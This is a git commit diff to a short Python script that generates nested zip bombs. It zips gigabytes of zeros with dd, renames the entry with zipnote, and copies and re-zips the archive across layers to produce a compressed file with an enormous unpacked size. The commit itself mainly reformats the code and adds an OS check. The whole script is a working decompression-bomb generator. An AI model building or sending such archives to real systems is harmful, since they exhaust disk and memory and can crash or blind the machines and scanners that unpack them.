255ef79d5a039c88ee348297af8fc6490b7e076e
Mike Okslong <69575053+thatOneArchUser@users.noreply.github.com>
2022-11-30 20:05:56 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,22 +1,36 @@
 import os
 import subprocess
 
+if os.name != "posix":
+    print("os not supported")
+    raise SystemExit
+
 layers = int(input("Amount of layers: "))
 files = int(input("Amount of files per layer: "))
-try: buff = int(input("dd buffer size (default=10 gb): "))
-except ValueError: buff = 10
+
+try:
+    buff = int(input("dd buffer size (default=10 gb): "))
+except ValueError:
+    buff = 10
+    
 print(f"total zip bomb size: {buff*(files**layers)} gigabytes")
 
 cwd = os.getcwd()
 try: os.mkdir("out")
-except FileExistsError: pass
+except FileExistsError:
+    pass
+
 os.chdir("out")
 subprocess.run(f"dd if=/dev/zero bs=1024 count={buff*(1024**2)} | zip zip0.zip -", shell=True)
 subprocess.run(r"zipnote -w zip0.zip <<<$'@ -\n@=0'", shell=True, executable="bash")
+
 for i in range(layers):
-    for j in range(files-1): os.system(f"cp zip0.zip zip{j+1}.zip")
-    try: os.mkdir(f"layer{i}")
-    except FileExistsError: pass
+    for j in range(files-1):
+        os.system(f"cp zip0.zip zip{j+1}.zip")
+    try:
+        os.mkdir(f"layer{i}")
+    except FileExistsError:
+        pass
     os.system(f"zip -r -9 \"layer{i}/zip0.zip\" *.zip")
     os.chdir(f"layer{i}")
 os.system(f"cp zip0.zip {cwd}/zipbomb.zip")
